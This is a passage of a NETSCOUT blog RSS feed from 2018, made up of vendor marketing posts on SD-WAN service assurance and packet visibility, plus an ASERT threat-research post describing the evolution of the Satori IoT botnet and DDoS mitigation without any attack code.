<p>The SD-WAN architecture gives you the opportunity to more easily and quickly deploy software features for many operational functions that can now extend beyond the WAN to the endpoints in the customer’s network. Now you can deploy a white box&nbsp;universal CPE (uCPE) and bring up virtual elements such as a firewall or other security features. These VNFs can now&nbsp;report&nbsp;much&nbsp;richer, packet-level traffic analysis for enhanced security.&nbsp;Adding virtual network functions (VNFs) has gotten much simpler than having to set up multiple tunnels over MPLS.&nbsp;</p>

<p><strong>Use&nbsp;Case:&nbsp;Improved&nbsp;Managed&nbsp;Security</strong></p>

<p>Firewall performance and&nbsp;managed&nbsp;security&nbsp;offerings can be greatly enhanced by adding traffic pattern analysis based on the monitoring of packet flow. During a distributed denial of service (DDoS) attack, for example, while the firewall might be looking for unique digital signatures, a service assurance VNF could identify both DDoS campaigns as well as unusual traffic patterns that are occurring during such an attack. The latter is a big deal&nbsp;since many DDoS campaigns are diversionary tactics while the real theft occurs unnoticed.</p>

<p>In the Internet of Things&nbsp;(IoT) age, where all of a sudden simple devices become Internet-enabled, they run the risk of being hacked. Malware, network exploits, and data theft can be launched from within your network via a backdoor to a managed device. Using tools deployed as VNFs in the SD-WAN service, you use probes and synthetic, diagnostic transactions to remotely monitor and understand the health of the WAN and premise applications. These tools can capture and report on traffic from every device and correlate this traffic data in real-time across a provider’s network, for deep visibility and split-second diagnostics, alerts, and responses.&nbsp;&nbsp;</p>

<h4>Other Opportunities to Leverage Traffic Metadata</h4>

<p>The traffic metadata generated by this type of enhanced service assurance solution can be used for a lot more than just bolstering your network defenses. It can also become part of an indexed repository of valuable information that you can use to inform real-time and actionable operational intelligence, business and marketing strategy, product and service design, and other initiatives. &nbsp;</p>

<p>With traffic volumes increasing and becoming more complex and the continual race to stay one step ahead of cybercrime techniques, the ability to virtually monitor, collect, and process traffic data at a packet level, end-to-end, across networks, and then respond with operational changes is quite an accomplishment. It’s possible, at minimal cost, using VNFs in the SD-WAN.</p>

<p>Data mining of user and application traffic and network and service sessions, from the source as it crosses the wire, eliminates the need for expensive middleware or aggregation servers. The metadata (generated without installing device agents or complex provisioning) can now include key traffic indicators, key performance indicators, and Layer 4 through 7 problem indicators for the discovered applications and servers. This type of VNF-based network and application service assurance solution can support hundreds of enterprise applications, including voice and video.</p>

<p>It’s definitely worth your consideration if you’re deploying an SD-WAN service.</p>

<p>NETSCOUT provides technologies that <a href="https://www.netscout.com/product/vscout-and-vstream" target="_blank">capture deeper traffic data</a> than ever before across diverse network topologies for service providers and enterprises and <a href="https://www.netscout.com/solutions/smart-data" target="_blank">Smart Data solutions</a> to make it usable for service assurance, business analytics, and security.&nbsp;</p>

<p><em>~Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/sd-wan-firewall.jpg" length="201226" type="image/jpeg"/>
    <guid isPermaLink="false">e7c56008-ffff-4e2e-b4d0-63696bc0c5e8</guid>
    <pubDate>Wed, 07 Feb 2018 01:30:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Unified Visibility is Smarter Visibility</title>
  <link>http://localhost:7996/blog/unified-visibility-smarter-visibility</link>
  <description>Security and service assurance engineers sometimes seem to speak a different language. They look at the computer and network systems they are responsible for from different perspectives. The monitoring fabrics for each function are often completely separate. These dual packet monitoring systems create a “Tower of Babel” scenario, whereas security and security assurance...</description>
  <content:encoded><![CDATA[<p>Security and service assurance engineers sometimes seem to speak a different language. They look at the computer and network systems they are responsible for from different perspectives. The monitoring fabrics for each function are often completely separate. These dual packet monitoring systems create a “Tower of Babel” scenario, whereas security and security assurance engineers cannot understand each other even when they need to look at the same data.</p>

<p>When a security event happens, security engineers may have a challenge asking for information from network engineers, because their systems use different terminology. And when these teams do connect, network engineers will talk about network visibility from a different perspective, making it difficult to provide effective support to the security team. Even when the both organizations have access to complete and relevant data, it is common to fail to connect the dots resulting in delayed validation of threats and subsequent response. &nbsp;</p>

<p>Security problems can often create network anomalies that can be detected by the service assurance teams monitoring traffic. When the visibility layer is unified, network security professionals can get early indicators of security concerns from the evidence of performance degradation seen by the service assurance engineers.</p>

<p>NETSCOUT solves the visibility problem with its Packet Flow Operating System (PFOS™), the software layer that turns a network switch into a packet broker. PFOS now includes security workflows—removing this roadblock. NETSCOUT uses the same operating system across its packet flow switch portfolio, powering the open compute packet brokers as well as its high-density chassis models that offer advanced functions, such as deduplication and masking. PFOS adapts and delivers functionality according to the platform. When security and IT teams use the same PFOS software running on the same hardware, they can collaborate easier since they can “speak the same language.”</p>

<p>Under a unified visibility architecture, security and security assurance teams get a holistic view of the network which will also increase the accuracy of problem detection. Lower false positives and negatives during the troubleshooting process increase the efficiency of both teams.</p>

<p>Now that PFOS combines both security and service assurance visibility, there is no need to build out independent overlay monitoring networks. The same hardware and software can be used for both tasks. And if you’ve already invested in a large-scale service assurance packet monitoring network, your investment is safe. All that’s needed is to add bypass taps for servers that need inline traffic access and set up the security workflows with PFOS.</p>

<p>Unified visibility is “smarter visibility.”&nbsp;You get:</p>

<ul>
	<li>Better collaboration between security and service assurance operations</li>
	<li>Faster and more accurate detection of both security and service assurance issues</li>
	<li>Faster and better response time for issues</li>
	<li>The ability to integrate service assurance alerts and triggers in the future to initiate security measures</li>
	<li>Lower costs (capex &amp; opex) for combined functions</li>
</ul>

<p>Our partners agree:</p>

<p>“What we find especially attractive about the NETSCOUT approach is that it supports all packet brokering capabilities and applications on open compute-based switches – including inline security. Unifying security and network visibility onto a single platform means substantial capex reduction for our clients. Their teams can also collaborate better thanks to the unified architecture and common operating system.”</p>

<p>—Phil Higgins, chief executive officer, <a href="http://www.brookcourtsolutions.com/">Brookcourt Solutions</a></p>

<p>When it comes to packet visibility, running separate infrastructure for security and service assurance is not only expensive. It’s inefficient since critical correlation data could be missed. Don’t get stuck in the past. Join the packet broker evolution and see what software makes possible. Visit our <a href="https://www.netscout.com/pfs/network-packet-broker-software-evolution">learning portal</a> to find out more. &nbsp;</p>

<p><em>~Written by Peter Vinsel, CTO, Packet Flow Systems Business Unit, NETSCOUT&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Security%202.0.jpg" length="277902" type="image/jpeg"/>
    <guid isPermaLink="false">e973943f-b11d-44bf-91ce-31da0121c2c4</guid>
    <pubDate>Mon, 05 Feb 2018 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Peter Vinsel</dc:creator>
    </item>
<item>
  <title>Adding Automated Service Assurance and Traffic Monitoring</title>
  <link>http://localhost:7996/blog/auto-service-assurance-traffic-monitor</link>
  <description>Lower cost. That’s perhaps the top benefit behind why Software-Defined WAN (SD-WAN) service is being adopted by many enterprise organizations. It’s clear that dividing traffic between expensive MPLS WAN circuits and less expensive Internet connections does reduce costs. But there are other big benefits that come with SD-WAN, such as faster service delivery. Another is...</description>
  <content:encoded><![CDATA[<p>Lower cost. That’s perhaps the top benefit behind why Software-Defined WAN (SD-WAN) service is being adopted by many enterprise organizations. It’s clear that dividing traffic between expensive MPLS WAN circuits and less expensive Internet connections does reduce costs. But there are other big benefits that come with SD-WAN, such as faster service delivery. Another is application-aware optimized network performance, where software-defined networking (SDN) architecture and solutions get to shine.</p>

<p>So when your customers ask “How can you verify my service level agreement when I sign up for SD-WAN?” You can now offer service assurance through traffic monitoring in a fully-automated solution―from your network core to end customer devices.</p>

<h4>Better SLA Enforcement is now Simple, Automated</h4>

<p>SLAs used to be pretty straightforward when WANs, LANs and VPNs made up the enterprise world. Now, networks, services, apps, and devices have changed dramatically with mobility and cloud. Data and traffic volumes have exploded. Network architectures have become more complex. Organizations with high-speed data centers, hybrid cloud environments, and virtual private clouds (VPCs) need to keep up with the accelerating pace of the digital economy. They can’t do that if apps and services are not running reliably and without required service levels.</p>

<p>So SLAs are now a key metric in the digital economy. If apps and services are not running reliably, with required service levels, entire businesses can fail. Brands can become tarnished. Customers will go elsewhere.</p>

<p>The good news is that verifying SLAs for services such as SD-WAN has gotten simpler and more accurate.</p>

<h4>Deploying Service Assurance from Core to Edge</h4>

<p>With the SD-WAN architecture, you can deploy service assurance as virtual network functions (VNFs) using a white box with a universal CPE (uCPE). Your service assurance VNFs can collect traffic data and apply policies beyond your WAN to the endpoints in a customer’s network. Adding VNFs is now much simpler than setting up multiple tunnels over MPLS. And your service assurance system can now ingest and process richer, real-time, end-to-end packet-level traffic analysis for enhanced security.</p>

<p>Yes, you can do all of this today but the challenges are daunting. Step 1: Pull together reports from the <a href="https://www.netscout.com/network-monitoring/" target="_blank">network monitoring</a> system. Step 2: Integrate them with results from your SD-WAN monitoring logs. Or create an API to tie together the two monitoring platforms. It’s hands-on, complex, and now unnecessary.</p>

<p>With service assurance deployed at the edge as fully-automated VNFs that are orchestrated across the customer network and your WAN, you deploy service assurance and monitoring quickly. You get end-to-end traffic data in real-time. And you get a single view of our SD-WAN service to monitor, enforce, and report on SLAs.</p>

<h4>Virtual End-to-End SLA Management in Action</h4>

<p>Continuous traffic monitoring and synthetic testing helps you ensure the availability, reliability, and performance of applications and services ― both on-premise and in the cloud. Infrastructure health monitoring of compute and network devices is also possible. When your service assurance VNF solution identifies a problem as an infrastructure issue, network administrators can drill down to find out where it is and better understand what is malfunctioning.</p>

<p>Server and device health can also be monitored through polling to provide a holistic view of the end-user experience. The availability and performance of applications can be tested from many locations simultaneously to provide visibility into any location or endpoint. Performance information can be sent to a dashboard with powerful systems administration tools.</p>

<h4>The Importance of Root Cause Analysis</h4>

<p>With cloud computing it was initially difficult to determine the root cause of service interruptions, given the complexity of cloud―and especially hybrid cloud―environments and enterprise networks. With a VNF solution for service assurance deployed in an SD-WAN, however, you can not only monitoring and manage traffic: you can assign blame for where an issue is impacting the service with much greater clarity.</p>

<p>Is it an SD-WAN issue affecting performance? A premises issue. The uCPE? A rogue server somewhere? A public or private cloud? With your VNF service assurance in place, you can know quickly and with greater confidence where the problem originates and get it fixed before SLAs are impacted.</p>

<h4>Make VNFs Part of Your Service Assurance Strategy for Verifying SD-WAN SLAs</h4>

<p>So as you launch or fine-tune your SD-WAN service offering, make sure to look at deploying the latest service assurance solutions as VNFs to better understand the health of the WAN and the health of premise applications. You can do it remotely. It’s simple and fast and automated.</p>

<p>With this type of solution in place, you can monitor traffic to understand network performance and adherence to SLAs. Through probing and synthetic transactions, you can measure for errors, throughput, and other performance metrics. You can quickly diagnose problems and communicate with who owns them, whether the customer, field maintenance teams, or admins in your data center.</p>

<p>As with SD-WAN service, virtual service assurance is a lot more cost-effective than alternatives like truck rolls, multi-system integrations, and sleepless nights.</p>

<p>NETSCOUT provides technologies that <a href="https://www.netscout.com/product/vscout-and-vstream" target="_blank">capture deeper traffic data</a> than ever before across diverse network topologies for service providers and enterprises and <a href="https://www.netscout.com/solutions/smart-data" target="_blank">Smart Data solutions</a> to make it usable.</p>

<p><em>~Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/sd-wan-sla.jpg" length="839523" type="image/jpeg"/>
    <guid isPermaLink="false">ec69f29d-7299-480e-ad42-6819ac512a01</guid>
    <pubDate>Wed, 31 Jan 2018 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Keeping The Lights On</title>
  <link>http://localhost:7996/blog/keeping-lights</link>
  <description>If there’s one industry where being kept in the dark is a very bad thing, it’s the energy and utility sector. Keeping the lights on and limiting outages is an imperative for energy providers. This has led suppliers to examine how digital transformation (DX) can improve their ability to maintain service availability to all utility customers, helping to balance energy generation...</description>
  <content:encoded><![CDATA[<p>If there’s one industry where being kept in the dark is a very bad thing, it’s the energy and utility sector. Keeping the lights on and limiting outages is an imperative for energy providers. This has led suppliers to examine how digital transformation (DX) can improve their ability to maintain service availability to all utility customers, helping to balance energy generation and transmission with consumption.</p>

<p>To maintain “always-on” service, IT professionals require real-time, actionable, traffic-based intelligence in order to detect any potential service degradations that might impact critical power generation and transmission performance. Armed with these invaluable insights, providers can rapidly address issues before they become service outages.</p>

<p>According to the World Economic Forum (WEF), many utilities are embracing DX to improve uptime and reduce maintenance costs by leveraging predictive maintenance analytics. In fact, the WEF cites PPL Electric reporting that shows a 38 percent improvement in service reliability through the use of improved analytics.<a href="#_ftn1" name="_ftnref1">[1]</a></p>

<p>This DX trend has seen the gradual rollout of always-connected, online smart meters to homes around the world. The energy industry is hoping that the adoption of these digital smart meters, which use wireless technology to provide customers with real-time usage data and access to account information, will influence how consumers use energy, while enabling companies to benefit from the direct engagement with their customers.</p>

<p>Beyond helping consumers self-regulate their energy usage, greater connectivity will enable energy suppliers to not only read meters remotely, but also benefit from automated consumer energy usage reporting and easier billing. At the same time, a growing reliance on real-time data, including the intelligence captured by remote line sensors and other connected equipment installed along the network grid, will enable energy companies to more effective regulate voltage levels, review efficiency, and manage routing and generation.</p>

<p>To ensure that network and associated applications and services are operational and remain in compliance with regional authorities, such as North American Electric Reliability Corporation (NERC), IT needs the right tools to achieve service assurance. This means capturing traffic data throughout the IT environment, in order to gain the insights needed to proactively triage performance issues in real time. By monitoring performance, IT gains an opportunity to pinpoint bandwidth contention, slow connections, and service degradation, and then take appropriate corrective or preventative actions. When service assurance is achieved, energy suppliers are able to remain compliant, while at the same time delivering an exceptional customer experience.</p>

<p>As they pursue DX initiatives, energy and utility companies can benefit from business analytics powered by smart data. This data is the best source of actionable insight in today’s digitally connected world. NETSCOUT’s patented Adaptive Service Intelligence™ (ASI) technology generates smart data based on software-centric pervasive instrumentation of traffic-flows that are collected and processed at the source – from physical and virtual (SDN/NFV) infrastructure on-premises, software-defined data centers (SDDC) and hybrid cloud environments - to produce service contextual metadata in real time.</p>

<p>In an increasingly complex, vulnerable and connected world, our service assurance and security solutions, in tandem with our smart data, provide extraordinary performance, service quality and operational excellence. With NETSCOUT, energy suppliers gain the confidence to operate, innovate and compete at the highest level.</p>

<p>For a more in-depth look at how DX is impacting the energy and utility industry, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Energy and Utility Sector</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Energy_Utilities.pdf">here</a>.</p>

<p><a href="#_ftnref1" name="_ftn1">[1]</a> <a href="http://www.energydigital.com/renewable-energy/how-digital-transformation-reshaping-energy-industry">http://www.energydigital.com/renewable-energy/how-digital-transformation-reshaping-energy-industry</a></p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_Energy.jpg" length="208854" type="image/jpeg"/>
    <guid isPermaLink="false">bf4dbb93-ce4e-498d-8849-b1d77f0a1974</guid>
    <pubDate>Wed, 31 Jan 2018 13:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Banking on DX to Meet Needs of a Changing Financial World</title>
  <link>http://localhost:7996/blog/banking-dx-meet-needs-changing-financial-world</link>
  <description>Few industries have been impacted more profoundly by technology innovations then the world of financial services. Despite the risk-averse nature of the business, this critically important sector has embraced digital transformation (DX) in response to customer demands for a seamless, secure, Omni-channel experience, as well as the need to reduce risk, maintain regulatory...</description>
  <content:encoded><![CDATA[<p>Few industries have been impacted more profoundly by technology innovations then the world of financial services. Despite the risk-averse nature of the business, this critically important sector has embraced digital transformation (DX) in response to customer demands for a seamless, secure, Omni-channel experience, as well as the need to reduce risk, maintain regulatory compliance, and identify fraud patterns and trading activity.</p>

<p>Of course, making inroads in today’s digital economy has created a host of challenges for financial service IT departments who must operate in the face of outmoded infrastructures that create IT silos, service performance degradation, lack of insights and inadequate visibility, and a daily threat of cyber-security breaches. &nbsp;</p>

<p>Overcoming these hurdles so financial services organizations can take full advantage of real-time, actionable insights into the connections and service inter-dependencies between stakeholders, data, and processes is a high priority for IT. A recent study commissioned by NETSCOUT highlights the impact that DX is having on the industry. &nbsp;<strong>Fifty-four percent of survey respondents indicated that the main impacts of the increasing pace of change on the financial services industry are competition</strong>, which is now global, <strong>and new products that need to reach the market as fast as possible.</strong></p>

<p>Highly agile fintech companies are leading the DX charge, utilizing technology solutions that rely on the immediacy of data in customer and financial transactions and integrating web, mobile, phone and in-person services to offer a more seamless experience. This trend is compelling banks, brokerages and other financial service businesses to focus on technological advancements for attracting and retaining account holders.</p>

<p>Evolving digital technologies are raising service delivery expectations and with the resulting escalating levels of interconnectivity required by these technologies, the need for service assurance across wired and wireless environments has never been greater. In short, outages or service degradations are simply unacceptable, and should they occur, they must be dealt with quickly.</p>

<p>To achieve service assurance, IT requires continuous monitoring and real-time analysis in order to rapidly detect and diagnose any sort of service delivery issues. This means IT needs actionable intelligence and end-to-end operational visibility of the entire IT infrastructure. Armed with this deep level of insights, IT can optimize agility, assure service delivery, mitigate risk and provide much needed feedback to operations, development, and business functions.&nbsp;</p>

<p>NETSCOUT delivers next-generation business assurance solutions that address the complex needs of financial services organizations’ applications, services, software, and hardware. We harness traffic data to help IT deal with resource constraints, disparate tools, IT silos, outdated processes, network complexity, and exponential data growth. NETSCOUT’s service assurance and security solution provides holistic visibility across the entire service delivery infrastructure from the wireless edge to the core to the data center and into the cloud. With our platform, financial services organizations gain essential visibility into the relationships and interrelated nature of the entire IT environment making it possible to more effectively triage service issues and maintain “always-on” availability.</p>

<p>For a more in-depth look at how DX is impacting financial services organizations, download the NETSCOUT white paper, <em>Assuring the Enterprise in the Digital Era – Financial Services</em>, by clicking <a href="https://www.netscout.com/sites/default/files/2017-10/NETSCOUT_WP_DX_Financial_Services.pdf">here</a>.</p>

<p><em>~Written by David Pitlik,&nbsp;Content Creator, Speechwriter, Technology Consultant&nbsp;</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/DX_Blog_Banner_Financial.jpg" length="99073" type="image/jpeg"/>
    <guid isPermaLink="false">c6b79d10-5263-4107-bdce-15aa3473e156</guid>
    <pubDate>Wed, 24 Jan 2018 12:30:16 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The ARC of Satori</title>
  <link>http://localhost:7996/blog/asert/arc-satori</link>
  <description>Authors: Pete Arzamendi, Matt Bing, and Kirk Soluk. Satori, the heir-apparent to the infamous IOT malware Mirai, was discovered by researchers in December 2017. The word "satori" means "enlightenment" or "understanding" in Japanese, but the evolution of the Satori malware has brought anything but clarity. Each new version offers a fresh combination of targeted platforms...</description>
  <content:encoded><![CDATA[<p>Authors: Pete Arzamendi, Matt Bing, and Kirk Soluk.</p>

<p>Satori, the heir-apparent to the infamous IOT malware Mirai, was discovered by researchers in December 2017. The word "satori" means "enlightenment" or "understanding" in Japanese, but the evolution of the Satori malware has brought anything but clarity. Each new version offers a fresh combination of targeted platforms, propagation techniques, and attack types. Contrasted with traditional software, in which features are added incrementally, Satori seems to go both forward and backward. Digging into the history will provide insight into this continually evolving threat.</p>

<h2>A Short History of IOT Malware</h2>

<p>Headlines about massive DDoS attacks first captured the public's attention on IOT security in late 2016. The malware responsible, Mirai, didn't target Windows machines like most threats – it targeted weaknesses in IOT devices and other embedded systems. These devices make great DDoS zombies, since often they run a stripped-down version of Linux, are directly connected to the Internet, and have limited security features. Mirai, and its many copycats, operate with similar principles:</p>

<ul><li>Propagation – Infected devices will attempt to infect other, randomly chosen, devices. Mirai started by using common username/password pairs via the antiquated telnet protocol. Later versions would use platform-specific vulnerabilities, like command-injection bugs in the web interface of home routers, to spread.</li>
	<li>Command-and-control – Once infected, the bot – in addition to propagating – would periodically check-in to a command-and-control site for updates and attack commands.</li>
	<li>Attack – Once instructed by the command-and-control, bots would launch a coordinated flood of attack traffic directed at the victim. This can be a flood of TCP packets with specific flags set, UDP packets, HTTP requests, or other more complicated attacks.</li>
</ul><p>The authors of Mirai eventually published the source code to the malware. With it, anyone who knows how to use a compiler could setup their own command-and-control site and quickly build their own Mirai botnet. Those with more technical know-how could add features like new propagation methods, command-and-control protocols, and new attack types.</p>

<h2>Satori</h2>

<p>Researchers first discovered Satori in December 2017 and other versions of it have been identified since. The initially discovered version of Satori distinguished itself from Mirai in that its propagation method targeted two vulnerabilities in IOT devices – a "zero-day" in Huawei's home gateway and a previously-known command execution vulnerability in Realtek's UPNP SOAP interface. Both were clearly intended to target two very specific types of devices, unlike the more agnostic Mirai, which would infect any device with a default or easily guessable telnet username and password. Although there is evidence Satori re-used at least some of the public Mirai code, its precise targeting was what caught the eye of researchers. To perhaps further muddy the waters, other versions of Satori do indeed use telnet to propagate, but with a more sophisticated list of usernames and passwords. Every IOT malware including Satori is delivered to a victim in a compiled, ready-to-run format. That means a Linux executable compiled specifically for the architecture of the victim. For instance – an ARM device cannot run an executable compiled for x86 processors. Before delivering its payload, both Mirai and Satori poke and prod the victim to determine which pre-compiled version of the Mirai binary to download and execute. Satori raised the bar by introducing new architectures – superh and ARC. It's unclear whether the actors behind Satori did this because they knew a vulnerable population existed, or only hoped that it did. Below is a chart showing the similarities and differences, based on ASERT analysis, between the three most recent variants of Satori. Complementary information, including additional IoC's, can be found in [1]-[5]. Variant 1 is not included due to its lack of functionality as discussed in [1].</p>

<p><img alt="Satori" data-entity-type="file" data-entity-uuid="ba28303d-2226-4cf9-b5a6-43a5b28cf198" src="http://localhost:7996/sites/default/files/inline-images/Satori.png" /><br />
We distinguish the fourth variant of Satori, in part, because it appears to be the first known ARC malware. Adding the capability to run on the ARC chip set greatly expands the potential botnet population. According to [6], an article that was written in 2014, "ARC processor IP cores have been licensed by more than 190 companies and are used in more than 1.5 billion products a year." Furthermore, now that this new ground has been broken, it paves the way for other malware authors to target that architecture.</p>

<h2>DDoS Mitigation</h2>

<p>Since the variants of Satori all leverage different subsets of the Mirai DDoS attack codebase, longstanding Mirai-based DDoS mitigation advice still applies. See for example the ASERT Blog entitled Mirai IoT Botnet Description and DDoS Attack Mitigation [7]. Arbor customers can also obtain detailed Arbor product-specific mitigation advice by requesting the latest ASERT Mirai threat advisory from their account team or Arbor ATAC. Additionally, the continued expansion of DDoS-capable malware to different processor architectures further emphasizes the need for network operators to adopt network BCPs. While Mirai showed an affinity for IPTV cameras and DVRs with weak passwords, threat actors are rewarded for targeting devices others have not. As malware authors expand to ARC and other embedded processors, DDoS-capable malware can subvert a wider range of Internet-connected devices such as phones, gaming consoles, etc. Network operators must re-think their defensive strategies to also protect against compromised internal devices including those which can't be tracked down by following a cable. The collateral damage due to scanning and outbound DDoS attacks alone can be crippling if network architectural and operational best current practices (BCPs) are not proactively implemented. BCP references can be found at [8] and [9].</p>

<h2>Conclusion</h2>

<p>While the impact of IOT malware is self-evident, the threat landscape is constantly evolving. The weakest-of-the-weak, default usernames and passwords, have already been abused and attackers move on to more bountiful fruit – exploitable vulnerabilities in devices themselves. This reflects the harbinger that Mirai brought the world in 2016 – IOT devices are insecure and will be abused. We expect the three principles of IOT malware – propagation, command-and-control, and attacks – to remain the same, but become more sophisticated and evolved over time.</p>

<h2>References</h2>

<p>[1] <a href="https://researchcenter.paloaltonetworks.com/2018/01/unit42-iot-malware-evolves-harvest-bots-exploiting-zero-day-home-router-vulnerability/">https://researchcenter.paloaltonetworks.com/2018/01/unit42-iot-malware-…</a></p>

<p>[2] <a href="https://research.checkpoint.com/good-zero-day-skiddie/">https://research.checkpoint.com/good-zero-day-skiddie/</a></p>

<p>[3] <a href="http://blog.netlab.360.com/warning-satori-a-new-mirai-variant-is-spreading-in-worm-style-on-port-37215-and-52869-en/">http://blog.netlab.360.com/warning-satori-a-new-mirai-variant-is-spread…</a></p>

<p>[4] <a href="http://blog.netlab.360.com/early-warning-a-new-mirai-variant-is-spreading-quickly-on-port-23-and-2323-en/">http://blog.netlab.360.com/early-warning-a-new-mirai-variant-is-spreadi…</a></p>

<p>[5] <a href="https://www.reddit.com/r/LinuxMalware/comments/7p00i3/quick_notes_for_okiru_satori_variant_of_mirai/">https://www.reddit.com/r/LinuxMalware/comments/7p00i3/quick_notes_for_o…</a></p>

<p>[6] <a href="http://www.techdesignforums.com/practice/technique/power-performance-processor-ip/">http://www.techdesignforums.com/practice/technique/power-performance-pr…</a></p>

<p>[7] <a href="http://asert.arbornetworks.com/mirai-iot-botnet-description-ddos-attack-mitigation/">http://asert.arbornetworks.com/mirai-iot-botnet-description-ddos-attack…</a></p>

<p>[8] <a href="https://app.box.com/s/osk4po8ietn1zrjjmn8b">https://app.box.com/s/osk4po8ietn1zrjjmn8b</a></p>

<p>[9] <a href="https://www.cisco.com/c/en/us/support/docs/ip/access-lists/13608-21.html">https://www.cisco.com/c/en/us/support/docs/ip/access-lists/13608-21.html</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">8b7c55b1-f2db-4ccd-a8ae-6acbb2a85f72</guid>
    <pubDate>Thu, 18 Jan 2018 21:03:24 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Fixing Service Failures with Real-Time Solutions</title>
  <link>http://localhost:7996/blog/fixing-service-failures-real-time-solutions</link>
  <description>Before turning to address the concept of repairing service failures with real-time solutions, the conflict of definitions about what real-time means in an on-demand world needs to be clarified so enterprises and service providers share the same expectations of what can be achieved. So-called real-time tools are not instant, because time is needed between collecting and...</description>
  <content:encoded><![CDATA[<p>Before turning to address the concept of repairing service failures with real-time solutions, the conflict of definitions about what real-time means in an on-demand world needs to be clarified so enterprises and service providers share the same expectations of what can be achieved. So-called real-time tools are not instant, because time is needed between<span style="font-weight: 400;"> collecting and analyzing data and coming up with an actionable insight. Increased automation and utilization of technologies such as artificial intelligence and anomaly detection can quickly strip non-relevant data out of the process, thereby accelerating it and reducing costs by not performing analytics on irrelevant inputs.</span></p>

<p>This approach is sometimes described as smart data and involves selecting only the most relevant data for analysis in order to accelerate decision-making so it is close to real-time. This might involve targeting seemingly anomalous data or the use of machine learning to select data for analysis which has previously borne fruit. However, this is not done in absolute real-time. Instead, results in the form of actionable business insights are revealed in a timeframe that can be described as rapid. A loose definition could be to describe this as business insights delivered in a timely manner so the organization can react before the issue or impact is experienced by the customer. Typically this will be a timeframe that is fast enough that the user experience is not impacted in a detectable way – fractions of a second or just a few seconds.</p>

<p>The acceleration of the process by smart data tools does not mean that the system is ignoring potentially useful data, it’s simply selecting the most relevant data. Organizations can therefore rely on smart data tools not to miss key data points in the haste to get to actionable insights. Such tools incorporate advanced data analytics capabilities that have in-built intelligence to ensure only relevant data – rather than all data – is analyzed. This automated capability is vital because of the costs associated with processing vast volumes of irrelevant information. The shortage of data analysts and data scientists means only the most relevant data should be analyzed and the cost of compute capacity – remember, cloud isn’t free – can be contained by only analyzing data that is likely to be relevant.</p>

<p>Fast reacting, accurate smart data tools that are aware of the context in which they are operating are therefore foundational to enabling service failures to be fixed in near real-time. For organizations that are deploying SD-WAN, for example, there will be added advantages because the technology extends a service provider’s ability to understand what’s going on in the network and by extension have some insight into the activities going on at each of an organization’s premises. Having knowledge about the system about what is likely to be the root cause of a service failure means specific data sources can be targeted to get to a speedy resolution with minimized analysis of non-relevant data.</p>

<p>This is an improvement&nbsp;because before SD-WAN, the access pipe was described only as either working or not working. Degradation was hard to diagnose until a failure and then truck roll and field technicians were required to locate the problem causing cost and delay. With SD-WAN, the service provider can identify degradation and outright failures giving greater insight to its operations teams and supporting customer organizations better.</p>

<p>For example, knowing that performance is degrading at a specific item of network equipment means it can be proactively repaired or replaced. That might involve replacing it when an engineer is next on site, thereby avoiding costly truck roll, or it might involve quick identification of a problem because the system knows performance had been degrading at a specific node, for example, and therefore that node is where the fault lies and a fix can be made.</p>

<p>Smart data relies on end-to-end pervasive visibility across all data and networks. It relies on service assurance data as one key indicator but service assurance itself relies on smart data to enable fixes to be made rapidly. Without smart data, operators are left to analyze vast volumes of data as they seek out the cause of an issue. Typically this involves uncovering false negatives as some data sources can reveal faults that are a consequence of the root cause of an issue rather than the source of the issue itself. Sifting these erroneous indicators out of the process takes time and consumes computing resources.</p>

<p>Smart data tools that are deployed across the organization and that continually learn the likeliest causes of faults can enable service assurance fixes to be made in near real-time. This ensures maximized uptime and network utilization, minimized truck roll and, ultimately, an improved customer experience delivered by the service provider at lower cost.</p>

<p><em>~Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/sd-wan-service-failures.jpg" length="734346" type="image/jpeg"/>
    <guid isPermaLink="false">1239b5f0-c5af-4865-93e4-604c95681c3d</guid>
    <pubDate>Thu, 18 Jan 2018 18:31:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
